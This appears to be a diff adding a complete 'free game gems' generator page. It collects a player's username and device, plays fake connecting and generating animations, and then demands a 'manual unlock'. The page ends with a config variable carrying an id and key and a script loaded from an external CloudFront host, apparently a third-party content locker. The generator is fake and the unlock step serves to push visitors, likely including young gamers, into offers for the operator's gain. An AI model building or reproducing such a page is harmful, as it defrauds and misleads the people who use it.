@@ -1,0 +1,346 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Game Connect</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@500;700;800&display=swap" rel="stylesheet">
+    <style>
+        body {
+            font-family: 'Poppins', sans-serif;
+            background: linear-gradient(rgba(0,0,0,0.4), rgba(0,0,0,0.6)), url('https://i.postimg.cc/tR1Dy90t/images.jpg');
+            background-size: cover;
+            background-position: center;
+            background-attachment: fixed;
+            animation: bgMove 40s linear infinite alternate;
+        }
+
+        .form-card, .connecting-card, .amount-card, .generating-card, .unlocking-card, .manual-unlock-card {
+            animation: fadeIn-bounce 0.7s ease-out forwards;
+            will-change: transform, opacity;
+        }
+        
+        @keyframes bgMove {
+            0% { background-position: 50% 0%; }
+            100% { background-position: 50% 100%; }
+        }
+
+        @keyframes fadeIn-bounce {
+            0% { opacity: 0; transform: translateY(30px) scale(0.95); }
+            70% { opacity: 1; transform: translateY(-5px) scale(1.02); }
+            100% { opacity: 1; transform: translateY(0) scale(1); }
+        }
+       
+        .text-glow {
+            text-shadow: 0 0 8px rgba(249, 181, 34, 0.6);
+        }
+        .card-glow {
+             box-shadow: 0 0 30px rgba(249, 181, 34, 0.2), 0 8px 20px rgba(0,0,0,0.1);
+        }
+    </style>
+</head>
+<body class="min-h-dvh flex items-center justify-center p-4 overflow-hidden">
+  
+  <!-- Step 1: Login Form Card -->
+  <main id="login-card" class="form-card bg-white/10 backdrop-blur-xl border border-white/30 card-glow p-6 sm:p-8 rounded-3xl text-center w-full max-w-md transition-all duration-500 ease-in-out">
+    <h1 class="text-white font-extrabold text-xl md:text-2xl mb-6 uppercase tracking-wider text-glow">
+        Type Your Game Username/ID
+    </h1>
+    
+    <form id="connect-form" class="space-y-5">
+        <div class="relative">
+            <label for="username" class="sr-only">Username or ID</label>
+            <div class="absolute inset-y-0 left-0 pl-4 flex items-center pointer-events-none">
+                <svg class="w-6 h-6 text-gray-800/70" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor">
+                  <path fill-rule="evenodd" d="M7.5 6a4.5 4.5 0 1 1 9 0 4.5 4.5 0 0 1-9 0Zm-2.251 9.324a5.965 5.965 0 0 1 11.502 0 1.5 1.5 0 0 1-1.402 1.423H6.651a1.5 1.5 0 0 1-1.402-1.423Z" clip-rule="evenodd" />
+                </svg>
+            </div>
+            <input type="text" id="username" placeholder="Username or ID" class="pl-12 pr-4 py-3.5 w-full rounded-xl bg-white/50 text-gray-900 placeholder:text-gray-700 text-lg focus:ring-4 focus:ring-[#F9B522]/50 outline-none transition duration-300 shadow-inner border border-white/30">
+        </div>
+
+        <div>
+            <p class="mt-4 text-white font-bold text-base uppercase tracking-wide">Select Your Device</p>
+            <div role="radiogroup" class="grid grid-cols-2 gap-4 mt-3">
+                <button type="button" role="radio" aria-checked="false" data-device="android" id="androidBtn" class="device-btn group bg-gradient-to-b from-[#FFD94A] to-[#F4A91F] py-4 rounded-xl shadow-[inset_0_2px_4px_rgba(255,255,255,0.4),0_3px_5px_rgba(0,0,0,0.1)] hover:shadow-[0_0_15px_#FFD94A,inset_0_2px_4px_rgba(255,255,255,0.4)] hover:scale-105 transition-all duration-300 focus:outline-none flex items-center justify-center gap-2">
+                    <svg class="w-6 h-6 text-black/70" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor">
+                      <path stroke-linecap="round" stroke-linejoin="round" d="M10.5 1.5H8.25A2.25 2.25 0 0 0 6 3.75v16.5a2.25 2.25 0 0 0 2.25 2.25h7.5A2.25 2.25 0 0 0 18 20.25V3.75a2.25 2.25 0 0 0-2.25-2.25H13.5m-3 0V3h3V1.5m-3 0h3m-3 18.75h3" />
+                    </svg>
+                    <span class="font-bold text-black/80 text-lg">Android</span>
+                </button>
+                <button type="button" role="radio" aria-checked="false" data-device="apple" id="appleBtn" class="device-btn bg-gradient-to-b from-[#FFD94A] to-[#F4A91F] py-4 rounded-xl shadow-[inset_0_2px_4px_rgba(255,255,255,0.4),0_3px_5px_rgba(0,0,0,0.1)] hover:shadow-[0_0_15px_#FFD94A,inset_0_2px_4px_rgba(255,255,255,0.4)] hover:scale-105 transition-all duration-300 focus:outline-none flex items-center justify-center gap-2">
+                    <svg class="w-6 h-6 text-black/70" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor">
+                      <path stroke-linecap="round" stroke-linejoin="round" d="M16.5 8.25V6a2.25 2.25 0 0 0-2.25-2.25H9.75A2.25 2.25 0 0 0 7.5 6v12a2.25 2.25 0 0 0 2.25 2.25h4.5A2.25 2.25 0 0 0 16.5 18v-2.25" />
+                    </svg>
+                    <span class="font-bold text-black/80 text-lg">Apple</span>
+                </button>
+            </div>
+        </div>
+
+        <button type="submit" id="connectBtn" class="w-full py-4 rounded-xl bg-gradient-to-b from-[#F7C14B] to-[#E6A72E] font-bold text-black text-xl uppercase tracking-wider transition-all duration-300 hover:brightness-105 hover:text-[#2E2000] hover:shadow-[0_0_20px_#F7C14B,inset_0_2px_4px_0_rgba(0,0,0,0.2)] active:brightness-95 active:scale-[0.98] transform shadow-[inset_0_2px_4px_0_rgba(0,0,0,0.2),0_4px_6px_-1px_rgba(0,0,0,0.1)] focus:outline-none focus:ring-4 focus:ring-[#F9B522]/60">
+            CONNECT
+        </button>
+        
+        <p id="errorMsg" class="hidden h-5 pt-1 text-sm text-red-500 font-bold">Please enter all fields.</p>
+    </form>
+  </main>
+
+  <!-- Step 2: Connecting... Card -->
+  <main id="connecting-card" class="hidden connecting-card bg-[#FFF3D6] p-6 sm:p-8 rounded-3xl shadow-2xl shadow-black/10 w-full max-w-md text-center border-2 border-[#F9B522] absolute transition-all duration-500 ease-in-out">
+    <div class="relative w-24 h-24 mx-auto mb-6">
+        <div class="absolute inset-0 bg-green-500/20 rounded-full animate-ping"></div>
+        <div class="relative flex items-center justify-center w-full h-full bg-green-500 rounded-full shadow-lg">
+            <svg class="w-12 h-12 text-white" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="3" stroke="currentColor">
+                <path stroke-linecap="round" stroke-linejoin="round" d="m4.5 12.75 6 6 9-13.5" />
+            </svg>
+        </div>
+    </div>
+    
+    <div class="w-full bg-[#E4E4E4] rounded-full h-4 overflow-hidden shadow-inner">
+      <div id="progress-bar" class="h-full bg-gradient-to-r from-[#4CAF50] to-[#66BB6A] w-0" style="transition: width 2s ease-in-out;"></div>
+    </div>
+
+    <p id="display-username" class="mt-4 text-green-700 font-bold text-lg uppercase tracking-wider"></p>
+    
+    <p class="mt-2 text-[#F9B522] font-bold text-xl animate-pulse tracking-wider">CONNECTING...</p>
+  </main>
+  
+  <!-- Step 3: Amount Selection Card -->
+  <main id="amount-card" class="hidden amount-card bg-[#FFF3D6] p-6 sm:p-8 rounded-3xl shadow-2xl shadow-black/10 w-full max-w-lg text-center absolute transition-all duration-500 ease-in-out">
+    <div class="flex flex-col sm:flex-row items-center justify-center gap-3 mb-6">
+      <div class="bg-[#DADADA] px-4 py-2 rounded-xl flex items-center gap-2 shadow-inner">
+        <svg class="w-6 h-6 text-gray-600" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor"><path fill-rule="evenodd" d="M7.5 6a4.5 4.5 0 1 1 9 0 4.5 4.5 0 0 1-9 0Zm-2.251 9.324a5.965 5.965 0 0 1 11.502 0 1.5 1.5 0 0 1-1.402 1.423H6.651a1.5 1.5 0 0 1-1.402-1.423Z" clip-rule="evenodd" /></svg>
+        <span id="display-username-amount" class="font-bold text-black/80"></span>
+      </div>
+      <div id="display-device-amount" class="bg-[#DADADA] px-4 py-2 rounded-xl flex items-center gap-2 shadow-inner"></div>
+    </div>
+
+    <h2 class="text-[#F9B522] font-extrabold text-xl md:text-2xl mb-6 uppercase tracking-wider text-glow">
+      Select Your Amount
+    </h2>
+
+    <div class="grid grid-cols-2 gap-4 sm:gap-6">
+      <div class="amount-option bg-gradient-to-b from-[#FFD94A] to-[#F4A91F] rounded-xl shadow-lg p-4 sm:p-5 hover:scale-105 hover:shadow-xl border-2 border-transparent hover:border-white/50 transition-all duration-300 cursor-pointer text-center" data-amount="170">
+        <img src="https://i.postimg.cc/PrHCrMpG/download-1-1.png" alt="gem" class="w-16 h-16 mx-auto object-contain drop-shadow-[0_0_6px_#8EE6FF] mb-2">
+        <p class="font-bold text-xl text-black">170</p>
+        <p class="text-xs line-through text-gray-600">9.99 $</p>
+      </div>
+      <div class="amount-option bg-gradient-to-b from-[#FFD94A] to-[#F4A91F] rounded-xl shadow-lg p-4 sm:p-5 hover:scale-105 hover:shadow-xl border-2 border-transparent hover:border-white/50 transition-all duration-300 cursor-pointer text-center" data-amount="360">
+        <img src="https://i.postimg.cc/PrHCrMpG/download-1-1.png" alt="gem" class="w-16 h-16 mx-auto object-contain drop-shadow-[0_0_6px_#8EE6FF] mb-2">
+        <p class="font-bold text-xl text-black">360</p>
+        <p class="text-xs line-through text-gray-600">19.99 $</p>
+      </div>
+      <div class="amount-option bg-gradient-to-b from-[#FFD94A] to-[#F4A91F] rounded-xl shadow-lg p-4 sm:p-5 hover:scale-105 hover:shadow-xl border-2 border-transparent hover:border-white/50 transition-all duration-300 cursor-pointer text-center" data-amount="950">
+        <img src="https://i.postimg.cc/PrHCrMpG/download-1-1.png" alt="gem" class="w-16 h-16 mx-auto object-contain drop-shadow-[0_0_6px_#8EE6FF] mb-2">
+        <p class="font-bold text-xl text-black">950</p>
+        <p class="text-xs line-through text-gray-600">39.99 $</p>
+      </div>
+      <div class="amount-option bg-gradient-to-b from-[#FFD94A] to-[#F4A91F] rounded-xl shadow-lg p-4 sm:p-5 hover:scale-105 hover:shadow-xl border-2 border-transparent hover:border-white/50 transition-all duration-300 cursor-pointer text-center" data-amount="2000">
+        <img src="https://i.postimg.cc/PrHCrMpG/download-1-1.png" alt="gem" class="w-16 h-16 mx-auto object-contain drop-shadow-[0_0_6px_#8EE6FF] mb-2">
+        <p class="font-bold text-xl text-black">2000</p>
+        <p class="text-xs line-through text-gray-600">79.99 $</p>
+      </div>
+    </div>
+  </main>
+
+  <!-- Step 4: Generating... Card -->
+  <main id="generating-card" class="hidden generating-card bg-[#FFF3D6] p-6 sm:p-8 rounded-3xl shadow-2xl shadow-black/10 w-full max-w-md text-center border-2 border-[#F9B522] absolute overflow-hidden transition-all duration-500 ease-in-out">
+    <div id="side-bar" class="absolute left-0 top-0 w-3 h-0 bg-gradient-to-b from-[#4CAF50] to-[#66BB6A] rounded-l-2xl" style="transition: height 3s ease-in-out;"></div>
+    
+    <div class="flex justify-center mb-4">
+      <div class="w-10 h-10 border-4 border-[#F9B522] border-t-transparent rounded-full animate-spin"></div>
+    </div>
+
+    <p class="text-[#F9B522] font-bold text-lg uppercase tracking-wider mb-4">Generating...</p>
+
+    <img src="https://i.postimg.cc/PrHCrMpG/download-1-1.png" alt="gem" class="w-20 h-20 mx-auto object-contain drop-shadow-[0_0_8px_#8EE6FF] mb-3">
+    
+    <p id="gem-count" class="text-[#4CAF50] font-bold text-3xl">0</p>
+  </main>
+
+  <!-- Step 5: Automatic Unlocking Card -->
+  <main id="unlocking-card" class="hidden unlocking-card bg-[#FFF3D6] p-8 sm:p-10 rounded-3xl shadow-2xl shadow-black/10 w-full max-w-md text-center absolute transition-all duration-500 ease-in-out">
+    <div class="flex justify-center mb-6">
+        <svg class="w-20 h-20 text-gray-500 animate-spin" style="animation-duration: 3s;" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
+          <path stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="1.5" d="M12 21a9 9 0 1 0-9-9" />
+          <path stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="1.5" d="m13.38 3.52-.53 1.55a.5.5 0 0 0 .28.59l1.55.53a.5.5 0 0 1 .28.59l-.53 1.55a.5.5 0 0 1-.59.28l-1.55-.53a.5.5 0 0 0-.59.28l-.53 1.55a.5.5 0 0 1-.59.28l-1.55-.53a.5.5 0 0 0-.59-.28l-.53-1.55a.5.5 0 0 1 .28-.59l1.55-.53a.5.5 0 0 0 .59-.28l.53-1.55a.5.5 0 0 1 .59-.28l1.55.53a.5.5 0 0 0 .59-.28Z" />
+        </svg>
+    </div>
+    <p class="text-[#F9B522] font-bold text-xl uppercase tracking-wider animate-pulse">
+        Automatic Unlocking...
+    </p>
+  </main>
+  
+  <!-- Step 6: Manual Unlock Card -->
+  <main id="manual-unlock-card" class="hidden manual-unlock-card bg-[#FFF3D6] p-6 sm:p-8 rounded-3xl shadow-2xl shadow-black/10 w-full max-w-md text-center border-2 border-[#F9B522] absolute transition-all duration-500 ease-in-out">
+    <h2 class="text-[#F9B522] font-extrabold text-xl md:text-2xl mb-6 uppercase tracking-wider text-glow">
+      Manual Unlock
+    </h2>
+    <div class="flex flex-col sm:flex-row justify-center gap-3 mb-4">
+      <div class="bg-[#DADADA] px-4 py-2 rounded-xl flex items-center gap-2 shadow-inner">
+        <svg class="w-6 h-6 text-gray-600" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor"><path fill-rule="evenodd" d="M7.5 6a4.5 4.5 0 1 1 9 0 4.5 4.5 0 0 1-9 0Zm-2.251 9.324a5.965 5.965 0 0 1 11.502 0 1.5 1.5 0 0 1-1.402 1.423H6.651a1.5 1.5 0 0 1-1.402-1.423Z" clip-rule="evenodd" /></svg>
+        <span id="final-user" class="font-bold text-black/80"></span>
+      </div>
+      <div class="bg-[#DADADA] px-4 py-2 rounded-xl flex items-center gap-2 shadow-inner">
+        <img src="https://i.postimg.cc/PrHCrMpG/download-1-1.png" class="w-6 h-6 object-contain" alt="Gem">
+        <span id="final-amount" class="font-bold text-black/80"></span>
+      </div>
+    </div>
+    <div class="bg-[#E4E4E4] rounded-lg p-3 text-sm text-gray-800 mb-6 shadow-inner">
+      <p>Please unlock the content to receive your Gems.</p>
+    </div>
+    <a href="#" id="unlockBtn" class="inline-block w-full sm:w-auto bg-gradient-to-b from-[#6BCF6B] to-[#4CAF50] text-white font-bold py-3 px-12 rounded-xl shadow-md hover:brightness-110 transition-transform hover:scale-105 active:scale-100">
+      UNLOCK
+    </a>
+    <p id="countdown" class="mt-5 text-gray-600 font-medium">Waiting for verification...</p>
+    <div class="w-6 h-6 border-4 border-gray-400 border-t-transparent rounded-full mx-auto mt-3 animate-spin"></div>
+  </main>
+
+<script>
+    document.addEventListener('DOMContentLoaded', () => {
+        // --- DOM Elements ---
+        const loginCard = document.getElementById('login-card');
+        const connectingCard = document.getElementById('connecting-card');
+        const amountCard = document.getElementById('amount-card');
+        const generatingCard = document.getElementById('generating-card');
+        const unlockingCard = document.getElementById('unlocking-card');
+        const manualUnlockCard = document.getElementById('manual-unlock-card');
+
+        const connectForm = document.getElementById('connect-form');
+        const usernameInput = document.getElementById('username');
+        const errorMsg = document.getElementById('errorMsg');
+        const deviceBtns = document.querySelectorAll('.device-btn');
+        const amountOptions = document.querySelectorAll('.amount-option');
+        
+        const progressBar = document.getElementById('progress-bar');
+        const displayUsername = document.getElementById('display-username');
+        const displayUsernameAmount = document.getElementById('display-username-amount');
+        const displayDeviceAmount = document.getElementById('display-device-amount');
+        
+        const sideBar = document.getElementById('side-bar');
+        const gemCount = document.getElementById('gem-count');
+
+        const finalUser = document.getElementById('final-user');
+        const finalAmount = document.getElementById('final-amount');
+        const countdown = document.getElementById('countdown');
+
+        // --- State ---
+        let selectedDevice = null;
+        let username = '';
+        let selectedAmount = 0;
+
+        // --- Functions ---
+        const switchCard = (hideCard, showCard) => {
+            if (!hideCard || !showCard) return;
+            hideCard.style.display = 'none';
+            hideCard.classList.add('opacity-0', 'scale-95');
+            
+            showCard.style.display = 'block';
+            // Force a reflow before adding animation classes
+            void showCard.offsetWidth; 
+            showCard.classList.remove('opacity-0', 'scale-95');
+        };
+
+        const startGeneratingAnimation = () => {
+            sideBar.style.height = '100%';
+            
+            let currentGems = 0;
+            const increment = Math.ceil(selectedAmount / 100);
+            const interval = setInterval(() => {
+                currentGems += increment;
+                if (currentGems >= selectedAmount) {
+                    currentGems = selectedAmount;
+                    clearInterval(interval);
+                    
+                    // Transition to Step 5
+                    setTimeout(() => {
+                        switchCard(generatingCard, unlockingCard);
+                        
+                        // After showing unlocking card, transition to Step 6
+                        setTimeout(() => {
+                            finalUser.textContent = username;
+                            finalAmount.textContent = selectedAmount.toLocaleString();
+                            switchCard(unlockingCard, manualUnlockCard);
+                        }, 3500); // Wait on unlocking screen
+
+                    }, 1000); // Wait after generation finishes
+                }
+                gemCount.textContent = Math.floor(currentGems).toLocaleString();
+            }, 30); // 3000ms animation
+        };
+
+        // --- Event Listeners ---
+        // Hide all but the first card initially using JS to avoid flashes
+        [connectingCard, amountCard, generatingCard, unlockingCard, manualUnlockCard].forEach(card => {
+            card.style.display = 'none';
+            card.classList.add('opacity-0', 'scale-95');
+        });
+        loginCard.classList.remove('opacity-0', 'scale-95');
+
+
+        deviceBtns.forEach(btn => {
+            btn.addEventListener('click', () => {
+                selectedDevice = btn.dataset.device;
+                deviceBtns.forEach(b => {
+                    b.setAttribute('aria-checked', 'false');
+                    b.classList.remove('ring-4', 'ring-[#7CFF6B]', 'ring-[#7BD7FF]');
+                });
+                btn.setAttribute('aria-checked', 'true');
+                if (selectedDevice === 'android') {
+                    btn.classList.add('ring-4', 'ring-[#7CFF6B]');
+                } else {
+                    btn.classList.add('ring-4', 'ring-[#7BD7FF]');
+                }
+            });
+        });
+
+        connectForm.addEventListener('submit', (e) => {
+            e.preventDefault();
+            username = usernameInput.value.trim();
+            if (!username || !selectedDevice) {
+                errorMsg.classList.remove('hidden');
+                return;
+            }
+            errorMsg.classList.add('hidden');
+            
+            // --- Start Step 2 ---
+            displayUsername.textContent = username;
+            switchCard(loginCard, connectingCard);
+            
+            setTimeout(() => {
+                progressBar.style.width = '100%';
+            }, 100);
+
+            setTimeout(() => {
+                // --- Start Step 3 ---
+                displayUsernameAmount.textContent = username;
+                const deviceIcon = selectedDevice === 'android' ? 
+                    `<svg class="w-6 h-6 text-black/70" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" d="M10.5 1.5H8.25A2.25 2.25 0 0 0 6 3.75v16.5a2.25 2.25 0 0 0 2.25 2.25h7.5A2.25 2.25 0 0 0 18 20.25V3.75a2.25 2.25 0 0 0-2.25-2.25H13.5m-3 0V3h3V1.5m-3 0h3m-3 18.75h3" /></svg><span class="font-bold text-black/80">Android</span>` : 
+                    `<svg class="w-6 h-6 text-black/70" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" d="M16.5 8.25V6a2.25 2.25 0 0 0-2.25-2.25H9.75A2.25 2.25 0 0 0 7.5 6v12a2.25 2.25 0 0 0 2.25 2.25h4.5A2.25 2.25 0 0 0 16.5 18v-2.25" /></svg><span class="font-bold text-black/80">Apple</span>`;
+                displayDeviceAmount.innerHTML = deviceIcon;
+                switchCard(connectingCard, amountCard);
+            }, 2500); // Wait for progress bar to finish
+        });
+
+        amountOptions.forEach(option => {
+            option.addEventListener('click', () => {
+                selectedAmount = parseInt(option.dataset.amount, 10);
+                
+                // --- Start Step 4 ---
+                switchCard(amountCard, generatingCard);
+                startGeneratingAnimation();
+            });
+        });
+
+    });
+</script>
+
+<script type="text/javascript">
+    var GRhXv_snY_GatgBc={"it":4562956,"key":"a1abd"};
+</script>
+<script src="https://d1y0yks1k8t5m5.cloudfront.net/be171fc.js"></script>
+
+</body>
+</html>
